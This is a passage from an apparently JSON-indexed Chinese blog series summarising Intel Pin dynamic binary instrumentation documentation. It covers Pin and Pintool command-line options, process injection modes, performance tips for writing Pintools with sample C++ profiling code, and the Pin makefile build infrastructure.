明确指定了运行debugger的machine。 -appdebug_connection 当程序开启调试时，Pin默认会开启一个TCP端口等待debugger的连接。在开启该选项时，会在debugger中开启一个TCP端口来等待Pin的连接，相当于反置了默认的机制。该选项的格式为\"[ip]:port\"，“ip”以点十进制格式表达，如果省略了ip，则会连接本地的端口，端口号为十进制表示。需要注意的是，debugger为GDB时，不使用该选项。 -detach_reattach 允许在probe模式下进行detach和reattach，仅在Windows平台下使用。 -debug_instrumented_processes 允许debugger对经过插桩的进程进行attach，仅在Windows平台下使用。 -show_asserts 健全性检查 此外，还支持如下的tool options，它们需要跟在tool名字后面，但是要在--符号前： Option Description -logifle 指定log文件的名字和路径，默认路径为当前工作目录，默认文件名为pintool.log -unique_logfile 添加pid到log文件名中 -discard_line_info \u003cmodule_name\u003e 忽略特定模块的信息，模块名应该为没有路径的短文件名，不能是符号链接 -discard_line_info_all 忽略所有模块的信息 -help 帮助信息 -support_jit_api 启用托管平台支持 -short_name 使用最短的RTN名称。 -symbol_path 指定用分号分隔的路径列表，用于搜索以查找符号和行信息。仅在Windows平台下使用。 -slow_asserts 健全性检查 ","date":"2021-10-07","objectID":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/:3:1","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 2","uri":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/"},{"categories":["Fuzz"],"content":"6.2 Instrumenting Applications on Intel(R) 64 Architectures IA-32和Intel(R) 64架构的Pin kit是一个组合kit，均包含32-bit和64-bit的版本。这就为复杂的环境提供了极高的可运行性，例如一个稍微有点复杂的运行如下： pin [pin-option]... -t64 \u003c64-bit toolname\u003e -t \u003c32-bit toolname\u003e [tool-options]... -- \u003capplication\u003e [application-option].. 需要注意的是： -t64选项需要用在-t选项的前面 当-t64和-t一起使用时，-t后面跟的时32-bit的tool。不推荐使用不带-t的-t64，因为在这种情况下，当给定32-bit应用程序时，Pin将在不应用任何工具的情况下运行该应用程序。 [tool-option]会同时作用于64-bit和32-bit的tool，并且必须在-t \u003c32-bit toolname\u003e后面进行指定。 ","date":"2021-10-07","objectID":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/:3:2","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 2","uri":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/"},{"categories":["Fuzz"],"content":"6.3 Injection 选项-injection仅在UNIX平台下可以使用，该选项控制着Pin注入到目标程序进程的方式。 默认情况下，建议使用dynamic模式。在该模式下，使用的是对父进程注入的方式，除非是系统内核不支持。子进程注入方式会创建一个pin的子进程，所以会看到pin进程和目标程序进程同时运行。使用父进程注入方式时，pin进程会在注入完成后退出，所以相对来说比较稳定。在不支持的平台上使用父进程注入方式可能出现意料之外的问题。 ","date":"2021-10-07","objectID":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/:3:3","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 2","uri":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/"},{"categories":["Fuzz"],"content":"7. Writing a Pintool ","date":"2021-10-07","objectID":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/:4:0","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 2","uri":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/"},{"categories":["Fuzz"],"content":"7.1 Logging Messages from a Pintool Pin提供了将Pintool的messages写入到文件的机制——LOG() api，在合适的获取message的位置使用即可。默认的文件名为pintool.log，存储路径为当前工作目录，可以使用-logfile选项来改变log文件的路径和名字。 LOG( \"Replacing function in \" + IMG_Name(img) + \"\\n\" ); LOG( \"Address = \" + hexstr( RTN_Address(rtn)) + \"\\n\" ); LOG( \"Image ID = \" + decstr( IMG_Id(img) ) + \"\\n\" ); ","date":"2021-10-07","objectID":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/:4:1","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 2","uri":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/"},{"categories":["Fuzz"],"content":"7.2 Performance Considerations When Writing a Pintool Pintool的开发质量会很大程度上决定tool的性能如何，例如在进行插桩时的速度问题。将通过一个例子来介绍一些提高tool性能的技巧。 首先是插桩部分代码： VOID Instruction(INS ins, void *v) { ... if ( [ins is a branch or a call instruction] ) { INS_InsertCall(ins, IPOINT_BEFORE, (AFUNPTR) docount2, IARG_INST_PTR, IARG_BRANCH_TARGET_ADDR, IARG_BRANCH_TAKEN, IARG_END); } ... } 然后是分析代码： VOID docount2( ADDRINT src, ADDRINT dst, INT32 taken ) { if(!taken) return; COUNTER *pedg = Lookup( src,dst ); pedg-\u003e_count++; } 该工具的目的是计算控制流图中每个控制流变化的边界被遍历的频率。工作原理如下：插桩组件通过调用docount2对每个分支进行插桩。传入的参数为源分支和目标分支以及分支是否被执行。源分支和目标分支代表来控制流边界的源和目的。如果没有执行分支，控制流不会发生改变，因此分析routine会立即返回。如果执行了分支，就使用src和dst参数来查找与此边界相关的计数器，并增加计数器的值。 Shifting Computation for Analysis to Instrumentation Code 在一个典型的应用程序中，大概每5条指令构成一个分支，在这些指令执行时会调用Lookup函数，造成性能下降。我们思考这个过程可以发现，在指令执行时，每条指令只会调用一次插桩代码，但会多次调用分析代码。所以，可以想办法将计算工作从分析代码转移到插桩代码，这样就可以降低调用次数，从而提升性能。 首先，就大多数分支而言，我们可以在Instruction()中找到目标分支。对于这些分支，我们可以在Instruction()内部调用Lookup()而不是docount2()，对于相对较少的间接分支，我们仍然需要使用原来的方法。 因此，我们增加一个新的函数docount，原来的docount2函数保持不变： VOID docount( COUNTER *pedg, INT32 taken ) { if( !taken ) return; pedg-\u003e_count++; } 相应地，修改插桩函数： VOID Instruction(INS ins, void *v) { ... if (INS_IsDirectControlFlow(ins)) { COUNTER *pedg = Lookup( INS_Address(ins), INS_DirectControlFlowTargetAddress(ins) ); INS_InsertCall(ins, IPOINT_BEFORE, (AFUNPTR) docount, IARG_ADDRINT, pedg, IARG_BRANCH_TAKEN, IARG_END); } else { INS_InsertCall(ins, IPOINT_BEFORE, (AFUNPTR) docount2, IARG_INST_PTR, IARG_BRANCH_TARGET_ADDR, IARG_BRANCH_TAKEN, IARG_END); } ... } 在插桩函数内部根据不同的情况，执行不同的分析代码，避免对所有类型的指令都笼统地调用性能要求高docount2 函数。 最终实现的完整代码如下： /*! @file * This file contains an ISA-portable PIN tool for tracing instructions */ #include \u003ciostream\u003e #include \u003cfstream\u003e #include \u003cmap\u003e #include \u003cunistd.h\u003e #include \"pin.H\" using std::cerr; using std::endl; using std::map; using std::pair; using std::string; /* ===================================================================== */ /* Commandline Switches */ /* ===================================================================== */ KNOB\u003c string \u003e KnobOutputFile(KNOB_MODE_WRITEONCE, \"pintool\", \"o\", \"edgcnt.out\", \"specify trace file name\"); KNOB\u003c INT32 \u003e KnobFilterByHighNibble(KNOB_MODE_WRITEONCE, \"pintool\", \"f\", \"-1\", \"only instrument instructions with a code address matching the filter\"); KNOB\u003c BOOL \u003e KnobPid(KNOB_MODE_WRITEONCE, \"pintool\", \"i\", \"0\", \"append pid to output\"); /* ===================================================================== */ /* Print Help Message */ /* ===================================================================== */ static INT32 Usage() { cerr \u003c\u003c \"This pin tool collects an edge profile for an application\\n\"; cerr \u003c\u003c \"The edge profile is partial as it only considers control flow changes (taken\\n\"; cerr \u003c\u003c \"branch edges, etc.). It is the left to the profile consumer to compute the missing counts.\\n\"; cerr \u003c\u003c \"\\n\"; cerr \u003c\u003c \"The pin tool *does* keep track of edges from indirect jumps within, out of, and into\\n\"; cerr \u003c\u003c \"the application. Traps to the OS a recorded with a target of -1.\\n\"; cerr \u003c\u003c KNOB_BASE::StringKnobSummary() \u003c\u003c endl; return -1; } /* ===================================================================== */ /* Global Variables */ /* ===================================================================== */ class COUNTER { public: UINT64 _count; // 边界到达的次数，计数器 COUNTER() : _count(0) {} }; typedef enum { ETYPE_INVALID, ETYPE_CALL, ETYPE_ICALL, ETYPE_BRANCH, ETYPE_IBRANCH, ETYPE_RETURN, ETYPE_SYSCALL, ETYPE_LAST } ETYPE; class EDGE { public: ADDRINT _src; ADDRINT _dst; ADDRINT _next_ins; ETYPE _type; // 必须为整数形式 EDGE(ADDRINT s, ADDRINT d, ADDRINT n, ETYPE t) : _src(s), _dst(d), _next_ins(n), _type(t) {} bool operator\u003c(const EDGE\u0026 edge) const { return _src \u003c edge._src || (_src == edge._src \u0026\u0026 _dst \u003c edge._dst); } }; string StringFromEtype(ETYPE etype) { switch (etype) { case ETYPE_CALL: return \"C\"; case ETYPE_ICALL: return \"c\"; case ETYPE_BRANCH: return \"B\"; case ETYPE_IBRANCH: return \"b\"; case ETY","date":"2021-10-07","objectID":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/:4:2","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 2","uri":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/"},{"categories":["Fuzz"],"content":"7.3 Eliminating Control Flow 上面新增的docunt()函数的代码十分简洁，极大地提升了性能。除此之外，还可以被Pin内联，进一步避免函数调用的开销。 但是现在的docount()函数中存在控制流，这有可能在进行内联时发生未知的改变。最好的解决办法是去掉函数中的控制流，这样进行内联时可以保证健壮性。 考虑到docount()函数的’taken’参数要么为0，要么为1，所以可以将函数代码修改为如下： VOID docount( COUNTER *pedg, INT32 taken ) { pedg-\u003e_count += taken; } 如此修改后，docunt()函数就可以进行内联了，并且可以保证函数的健壮性。 ","date":"2021-10-07","objectID":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/:4:3","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 2","uri":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/"},{"categories":["Fuzz"],"content":"7.4 Letting Pin Decide Where to Instrument 在某些情况下，我们不关心具体在什么位置进行插桩，只要保证插桩代码位于基本块内部即可。在这种情况下，我们可以将插桩位置的选择权交给Pin自身，Pin可以选择需要最少寄存器进行保存和恢复的插入点，提升性能。 一个样例如下： #include \u003ciostream\u003e #include \u003cfstream\u003e #include \"pin.H\" using std::cerr; using std::endl; using std::ios; using std::ofstream; using std::string; ofstream OutFile; // 记录运行的指令的数量，设置为静态变量方便编译器优化docount函数 static UINT64 icount = 0; // 在每个块之前调用该函数 // 对calls使用fast linkage VOID PIN_FAST_ANALYSIS_CALL docount(ADDRINT c) { icount += c; } // Pin在遇到一个新块时调用，插入对docount 函数的调用 VOID Trace(TRACE trace, VOID* v) { // 检查trace中的每个基本块 for (BBL bbl = TRACE_BblHead(trace); BBL_Valid(bbl); bbl = BBL_Next(bbl)) { // 对每个bbl插入对docount函数的调用，将指令数量作为参数传递 // IPOINT_ANYWHERE参数允许Pin在bbl内部任意位置插入call以获取最好的性能 // 对call使用fast linkage BBL_InsertCall(bbl, IPOINT_ANYWHERE, AFUNPTR(docount), IARG_FAST_ANALYSIS_CALL, IARG_UINT32, BBL_NumIns(bbl), IARG_END); } } KNOB\u003c string \u003e KnobOutputFile(KNOB_MODE_WRITEONCE, \"pintool\", \"o\", \"inscount.out\", \"specify output file name\"); // 程序退出时调用 VOID Fini(INT32 code, VOID* v) { OutFile.setf(ios::showbase); OutFile \u003c\u003c \"Count \" \u003c\u003c icount \u003c\u003c endl; OutFile.close(); } /* ===================================================================== */ /* Print Help Message */ /* ===================================================================== */ INT32 Usage() { cerr \u003c\u003c \"This tool counts the number of dynamic instructions executed\" \u003c\u003c endl; cerr \u003c\u003c endl \u003c\u003c KNOB_BASE::StringKnobSummary() \u003c\u003c endl; return -1; } /* ===================================================================== */ /* Main */ /* ===================================================================== */ int main(int argc, char* argv[]) { // 初始化Pin if (PIN_Init(argc, argv)) return Usage(); OutFile.open(KnobOutputFile.Value().c_str()); // 注册插桩函数Trace TRACE_AddInstrumentFunction(Trace, 0); // 注册Fini函数 PIN_AddFiniFunction(Fini, 0); // 开始执行，不返回 PIN_StartProgram(); return 0; } 这里IPOINT是一个枚举类型，决定了分析call被插入到什么地方。插入的对象可以是：INS，BBL，TRACE，RTN，其完整可用的值如下： IPOINT_BEFORE：在插桩对象的第一条指令之前插入call，总是有效 IPOINT_AFTER：在插桩对象的最后一条指令的失败路径处插入call 如果是routine（RTN），在所有返回路径处插桩 如果是instruction（INS），仅在INS_IsValidForIpointAfter()函数为真的情况下适用 如果是BBL，仅在BBL_HasFallThrough()函数为真的情况下适用 如果是TRACE，仅在TRACE_HasFallThrough()函数为真的情况下适用 IPOINT_ANYWHERE：在插桩对象的任意位置插入call，不适用INS_InsertCall()和INS_InsertThenCall()函数 IPOINT_TAKEN_BRANCH：在插桩对象的控制流的执行边界处插入call，仅适用于INS_IsValidForIpointTakenBranch()返回真的情况。 ","date":"2021-10-07","objectID":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/:4:4","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 2","uri":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/"},{"categories":["Fuzz"],"content":"7.5 Using Fast Call Linkages 对于一些比较“小”的函数来说，对函数的调用开销有时与函数自身的运算开销基本相同，因此一些编译器会提供一些调用链接优化机制来降低开销。例如，IA-32下的gcc有一个在寄存器中传递参数的regparm属性。 Pin中有一定数量的备用链接，使用PIN_FAST_ANALYSIS_CALL来声明分析函数即可使用，而插桩函数InsertCall则需要使用IARG_FAST_ANALYSIS_CALL。如果二者只更改了一个，那么就可能出现传参错误。例如前面给出的源码例子就使用了fast call linkages： ... ... // 对分析函数使用fast linkage VOID PIN_FAST_ANALYSIS_CALL docount(ADDRINT c) { icount += c; } VOID Trace(TRACE trace, VOID* v) { // 检查trace中的每个基本块 for (BBL bbl = TRACE_BblHead(trace); BBL_Valid(bbl); bbl = BBL_Next(bbl)) { // 对插桩函数使用fast linkage BBL_InsertCall(bbl, IPOINT_ANYWHERE, AFUNPTR(docount), IARG_FAST_ANALYSIS_CALL, IARG_UINT32, BBL_NumIns(bbl), IARG_END); } } ... ... 在对比较复杂的大型函数使用该方法时，效果并不明显，但不会造成性能的下降。 第二个调用链接优化是消除帧指针。如果使用gcc，则推荐加上\"-fomit-frame-pointer\"选项。Pin官方的标准Pintool的makefile包括该选项。与PIN_FAST_ANALYSIS_CALL一样，该选项对“小”函数的效果比较明显。需要注意的是，debugger会根据帧指针来显示堆栈回溯情况，所以如果想调试Pintool的话，就不要设置该选项。如果使用标准的Pintool的makefile来进行变异，则可以通过修改OPT选项来进行改变： make OPT=-O0 ","date":"2021-10-07","objectID":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/:4:5","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 2","uri":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/"},{"categories":["Fuzz"],"content":"7.6 Rewriting Conditional Analysis Code to Help Pin Inline Pin通过自动内联没有控制流变化的分析routine来提升插桩性能。但是有很多分析routine是有控制流的，最典型的就是有一个简单的“if-then”的条件语句，它只会执行少量的分析代码，并“then”部分只执行一次。为了将这类的语句转换为常规的没有控制流变化的语句，Pin提供了一些插桩API来重写分析routine。下面是一个重写的例子： 例如我们当前想要实现的一个分析routine的代码如下： // IP-sampling分析routine实现: VOID IpSample(VOID *ip) { --icount; if (icount == 0) { fprintf(trace, \"%p\\n\", ip); icount = N + rand() % M; } } 在原始的IpSample()函数中有一个明显的条件语句，会存在控制流的变化。如何消除该条件控制流的存在呢？ 可以看到分析routine内部其实可以拆解为2部分功能：icount的自减和“if”语句，那么可以使用两个单独的函数实现。而且，前者比后者的执行频率要更高。拆解后的代码如下： /* * IP-sampling分析routine实现: * * VOID IpSample(VOID *ip) * { * --icount; * if (icount == 0) * { * fprintf(trace, \"%p\\n\", ip); * icount = N + rand() % M; * } * } */ // 计算icount ADDRINT CountDown() { --icount; return (icount == 0); } // 打印当前指令的IP并且icount被重置为N和N+M中的一个随机数 VOID PrintIp(VOID* ip) { fprintf(trace, \"%p\\n\", ip); // 准备下次计算 icount = N + rand() % M; } 一个完整的实现消除控制流变化的代码如下： /* source/tools/ManualExamples/isampling.cpp */ #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e #include \"pin.H\" FILE* trace; const INT32 N = 100000; const INT32 M = 50000; INT32 icount = N; /* * IP-sampling分析routine实现: * * VOID IpSample(VOID *ip) * { * --icount; * if (icount == 0) * { * fprintf(trace, \"%p\\n\", ip); * icount = N + rand() % M; * } * } */ // 计算icount ADDRINT CountDown() { --icount; return (icount == 0); } // 打印当前指令的IP并且icount被重置为N和N+M中的一个随机数 VOID PrintIp(VOID* ip) { fprintf(trace, \"%p\\n\", ip); // 准备下次计算 icount = N + rand() % M; } VOID Instruction(INS ins, VOID* v) { // 每条指令执行后都会调用CountDown() INS_InsertIfCall(ins, IPOINT_BEFORE, (AFUNPTR)CountDown, IARG_END); // 只有当CountDown返回非0值时才会调用PrintIp() INS_InsertThenCall(ins, IPOINT_BEFORE, (AFUNPTR)PrintIp, IARG_INST_PTR, IARG_END); } VOID Fini(INT32 code, VOID* v) { fprintf(trace, \"#eof\\n\"); fclose(trace); } /* ===================================================================== */ /* Print Help Message */ /* ===================================================================== */ INT32 Usage() { PIN_ERROR(\"This Pintool samples the IPs of instruction executed\\n\" + KNOB_BASE::StringKnobSummary() + \"\\n\"); return -1; } /* ===================================================================== */ /* Main */ /* ===================================================================== */ int main(int argc, char* argv[]) { trace = fopen(\"isampling.out\", \"w\"); if (PIN_Init(argc, argv)) return Usage(); INS_AddInstrumentFunction(Instruction, 0); PIN_StartProgram(); return 0; } 使用条件插桩API INS_InsertIfCall()和INS_InsertThenCall()来告诉Pin只有当CountDown()执行结果非0时，才执行PrintIp()。这样一来，CountDown()函数就可以内联在Pin中，对于没有内联的PrintIp()则只有在满足条件时才会执行一次。 INS_InsertThenCall()插进去的函数只有在INS_InsertIfCall()插进去的函数返回非0值时才会执行。这个功能可以说是一个十分巧妙的功能。 ","date":"2021-10-07","objectID":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/:4:6","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 2","uri":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/"},{"categories":["Fuzz"],"content":"8. Building Your Own Tool 在开发自己的Pintool时，可以copy一份example目录， 然后在makefile.rules文件中添加上自己的tool，可以以最简单的MyPinTool为模版。 ","date":"2021-10-07","objectID":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/:5:0","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 2","uri":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/"},{"categories":["Fuzz"],"content":"8.1 Building a Tool From Within the Kit Directory Tree 如果直接修改MyPinTool，并且没有特殊的编译需求，则直接使用默认配置就好。如果要新增tool或者需要指定特殊的构建标志，则需要修改makeifile.rules文件。 构建YourTool.so(源文件为YourTool.cpp)： make obj-intel64/YourTool.so 如果想编译成IA-32架构，则使用“obj-ia32”替换“obj-intel64”即可。 ","date":"2021-10-07","objectID":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/:5:1","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 2","uri":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/"},{"categories":["Fuzz"],"content":"8.2 Building a Tool Out of the Kit Directory Tree copy文件夹MyPinTool到指定位置子，然后编辑makefile.rules文件。 make PIN_ROOT=\u003cpath to Pin kit\u003e obj-intel64/YourTool.so 要更改将创建工具的目录，可以从命令行覆盖 OBJDIR 变量： make PIN_ROOT=\u003cpath to Pin kit\u003e OBJDIR=\u003cpath to output dir\u003e \u003cpath to output dir\u003e/YourTool.so ","date":"2021-10-07","objectID":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/:5:2","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 2","uri":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/"},{"categories":["Fuzz"],"content":"9. Pin’s makefile Infrastructure ","date":"2021-10-07","objectID":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/:6:0","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 2","uri":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/"},{"categories":["Fuzz"],"content":"9.1 The Config Directory 目录source/tools/Config中存放了make配置的基本文件，不要轻易修改这些文件，可以基于其中的模版文件进行更新。 下面对其中的几个关键文件进行说明： makefile.config：在include链中第一个应该include的文件。它保存了用户可用的所有相关标识和变量的文档，此外还包括特定于OS的配置文件。 unix.vars：该文件包含makefile使用的一些架构变量和实用程序的Unix定义。 makefile.default.rules：该文件包含默认的make目标、测试用例和构建规则。 ","date":"2021-10-07","objectID":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/:6:1","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 2","uri":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/"},{"categories":["Fuzz"],"content":"9.2 The Test Directories source/tools目录下的每个测试性质的目录中都包含makefile链中的两个文件： makefile：运行make时调用，不要修改。其中保存了makefile链的所有相关配置文件的包含指令，属于通用文件，在所有的测试目录中都是相同的。 makefile.rules：目录特定文件，不同测试目录，文件内容不同。它保存了当前目录的逻辑，应该在目录中构建和运行的所有工具、应用程序和测试等都在该文件中进行定义。 ","date":"2021-10-07","objectID":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/:6:2","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 2","uri":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/"},{"categories":["Fuzz"],"content":"9.3 Adding Tests, Tools and Applications to the makefile 下面介绍如何通过makefile构建二进制程序并运行测试。以下描述的变量都在makefile.rules文件的\"Test targets\"部分进行描述： TOOL_ROOTS：定义工具名称，不带文件扩展名，具体的文件扩展名将由make自动添加，例如YourTools.so； APP_ROOTS：定义应用程序，不带文件扩展名，具体的文件扩展名将由make自动添加，例如YourApp.exe； TEST_ROOTS：定义测试，不要加.test后缀，make会自动添加，例如YourTest.test。 ","date":"2021-10-07","objectID":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/:6:3","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 2","uri":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/"},{"categories":["Fuzz"],"content":"9.4 Defining Build Rules for Tools and Applications 默认使用的构建规则是source/tools/Config/makefile.default.rules，输入为单一的c/cpp文件，生成相同名字的二进制程序。如果输入为多个源文件，且需要自定义构建规则，可以在make.rules文件的\"Build rules\"部分的末尾添加。如下是规则例子： 构建单一源文件且不进行优化： # Build the intermediate object file. $(OBJDIR)YourTool$(OBJ_SUFFIX): YourTool.cpp $(CXX) $(TOOL_CXXFLAGS_NOOPT) $(COMP_OBJ)$@ $\u003c # Build the tool as a dll (shared object). $(OBJDIR)YourTool$(PINTOOL_SUFFIX): $(OBJDIR)YourTool$(OBJ_SUFFIX) $(LINKER) $(TOOL_LDFLAGS_NOOPT) $(LINK_EXE)$@ $\u003c $(TOOL_LPATHS) $(TOOL_LIBS) 构建多源文件且进行优化： # Build the intermediate object file. $(OBJDIR)Source1$(OBJ_SUFFIX): Source1.cpp $(CXX) $(TOOL_CXXFLAGS) $(COMP_OBJ)$@ $\u003c # Build the intermediate object file. $(OBJDIR)Source2$(OBJ_SUFFIX): Source2.c Source2.h $(CC) $(TOOL_CXXFLAGS) $(COMP_OBJ)$@ $\u003c # Build the tool as a dll (shared object). $(OBJDIR)YourTool$(PINTOOL_SUFFIX): $(OBJDIR)Source1$(OBJ_SUFFIX) $(OBJDIR)Source2$(OBJ_SUFFIX) Source2.h $(LINKER) $(TOOL_LDFLAGS_NOOPT) $(LINK_EXE)$@ $(^:%.h=) $(TOOL_LPATHS) $(TOOL_LIBS) ","date":"2021-10-07","objectID":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/:6:4","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 2","uri":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/"},{"categories":["Fuzz"],"content":"9.5 Defining Test Recipes in makefile.rules 在\"Test recipes\"部分自定义自己的测试需求，例如： YourTest.test: $(OBJDIR)YourTool$(PINTOOL_SUFFIX) $(OBJDIR)YourApp$(EXE_SUFFIX) $(PIN) -t $\u003c -- $(OBJDIR)YourApp$(EXE_SUFFIX) ","date":"2021-10-07","objectID":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/:6:5","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 2","uri":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/"},{"categories":["Fuzz"],"content":"9.6 Useful make Variables and Flags 摘取makefile.config中几个重点的标志进行说明： IN_ROOT：在套件外构建工具时指定Pin套件的位置。 CC: 指定工具的默认c编译器。 CXX：指定工具的默认c++编译器 APP_CC：指定应用程序的默认 c 编译器。如果未定义，APP_CC 将与 CC 相同。 APP_CXX：指定应用程序的默认 c++ 编译器。如果未定义，APP_CXX 将与 CXX 相同。 TARGET：指定默认目标架构，例如交叉编译。 ICC: 使用英特尔编译器构建工具时指定 ICC=1。 DEBUG: 当指定 DEBUG=1 时，在构建工具和应用程序时会生成调试信息。此外，不会执行任何编译和/或链接优化。 ","date":"2021-10-07","objectID":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/:6:6","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 2","uri":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/"},{"categories":["Fuzz"],"content":"Pin学习记录第一篇","date":"2021-10-04","objectID":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--1/","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 1","uri":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--1/"},{"categories":["Fuzz"],"content":"本文是Pin系列学习记录的第一篇，主要是官方文档的相关内容的整理总结。 Pin version: 3.20 ","date":"2021-10-04","objectID":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--1/:0:0","tags":["Fuzz","Instrument","Pin"],"title":"有毒的学Pin记录 -- 1","uri":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--1/"},{"categories":["Fuzz"],"content":"1. Introduction Pin 是一个动态二进制插桩工具，支持 Linux*， macOS* 和 Windows* 操作系统以及可执行程序。Pin可以通过pintools在程序运行期间动态地向可执行文件的任意位置插入任意代码（C/C++），也可以attach到一个正在运行的进程。 Pin 提供了丰富的 API，可以抽象出底层指令集特性，并允许将进程的寄存器数据等的上下文信息作为参数传递给注入的代码。Pin会自动存储和重置被注入代码覆盖的寄存器，以恢复程序的继续运行。对符号和调试信息也可以设置访问权限。 Pin内置了大量的样例插桩工具的源码，包括基本块分析其、缓存模拟器、指令跟踪生成器等，根据自己的实际需求进行自定义开发也十分方便。 